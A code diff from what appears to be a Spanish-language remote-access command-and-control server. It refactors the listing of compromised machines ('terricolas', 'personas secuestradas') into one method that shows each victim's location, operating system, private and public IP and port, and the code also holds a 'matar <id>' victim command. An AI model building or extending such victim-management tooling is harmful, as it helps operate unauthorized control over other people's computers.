@@ -239,18 +239,33 @@ class Server(Thread):
 
 	# --------- LISTAR VICTIMAS ---------
 
-	def ver_terricolas(self):
+	def ver_terricolas(self,modo):
+
+		# ["ID", "Terricola", "Pais", "Ciudad" ]
+		# terricola[2],terricola[4]["country_name"],terricola[4]["city_name"]
+
+		# ["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"]
+		# terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]
 
 		lista_terricolas_table = []
 
-		for terricola in self.terricolas:
-			lista_terricolas_table.append([terricola[2],terricola[3]["country_name"],terricola[3]["city_name"]])
+		if (modo=="abduccion"):
+			encabezados = ["ID", "Terricola", "Pais", "Ciudad" ]
+
+			for terricola in self.terricolas:
+				lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"]])
+
+		elif (modo=="laboratorio"):
+			encabezados = ["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"]
+
+			for terricola in self.terricolas:
+				lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]])
+
 
 		if(len(self.terricolas)>0):
-			print ("\n")
-			print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")
+			print ("\n \033[1;34mLista de personas secuestradas\033[0;39m\n")
 			index = [i for i in range(1,len(self.terricolas)+1)]
-			print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad" ], showindex=index),"\n\n")
+			print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=encabezados, showindex=index),"\n\n")
 
 		else:
 		 	print("\n [\033[1;31mx\033[0;39m] No hay personas capturadas\n")
@@ -762,10 +777,6 @@ def laboratorio(servidor):
 
 	}
 
-	lista_terricolas_table = []
-
-	for terricola in servidor.terricolas:
-		lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]])
 
 	encabezados("laboratorio")
 
@@ -815,16 +826,7 @@ def laboratorio(servidor):
 					print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");
 
 		elif (prompt_laboratorio=="listar"):
-			if(len(servidor.terricolas)>0):
-				print ("\n")
-
-				print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")
-
-				index = [i for i in range(1,len(servidor.terricolas)+1)]
-				print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"], showindex=index),"\n\n")
-
-			else:
-				print("\n [\033[1;31mx\033[0;39m] No hay personas secuestradas\n")
+			servidor.ver_terricolas("laboratorio")
 
 		elif (prompt_laboratorio=="ayuda"):
 			desplegar_ayuda(COMANDOS,'laboratorio')
@@ -887,7 +889,7 @@ def abducciones_menu(servidor):
 			encabezados("abduccion")
 
 		elif (selector=='abducidos'):
-			servidor.ver_terricolas()
+			servidor.ver_terricolas("abduccion")
 
 		elif (selector=='ayuda'):
 			desplegar_ayuda(COMANDOS,"abducciones")
